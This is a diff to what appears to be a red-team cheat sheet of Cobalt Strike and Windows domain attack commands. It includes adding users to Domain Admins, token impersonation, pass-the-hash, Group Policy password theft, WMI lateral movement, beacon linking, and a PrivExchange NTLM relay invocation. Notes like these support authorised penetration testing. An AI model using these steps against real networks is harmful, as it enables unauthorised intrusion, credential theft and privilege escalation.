@@ -26,11 +26,14 @@ Net Commands
   shell net group "Domain Admins" username /add /domain
   
 Cobalt
+  note mynote (Give beacon a name)
+  sleep 60 15 (60 second sleep with 15% jitter)
   make_token domain\user password
   rev2self
   pth (Will perform a Kerberos downgrade and could be detected)
   Powershell-Import /path/to/ps1 file
     - Get-GPPPassword
+  Spawn x64 listener (Move out of Powershell); then kill old listener
   If admin you can inject into system process to become SYSTEM or another process
   
   Connect MetaSploit to Cobalt Listener
@@ -44,7 +47,7 @@ Lateral Movement
   shell dir \\system\c$ (Check if admin)
   shell net use \\system\c$
   wmi \\system listener (tab complete listener)
-  spawn listener (New listerner that is not Powershell)
+  spawn x64 listener (New listerner that is not Powershell)
   unlink ip addr of attack system (from target; can tab complete)
   link ip addr of target system (from attack box; verify dual home IP addresses)
   exit original beacon
@@ -57,3 +60,5 @@ PrivExchange
   python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
   # Windows Version
    - http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
+   
+ Artfact,PS_Log,Term_Log,CS_log [gui+cmd],CherTree
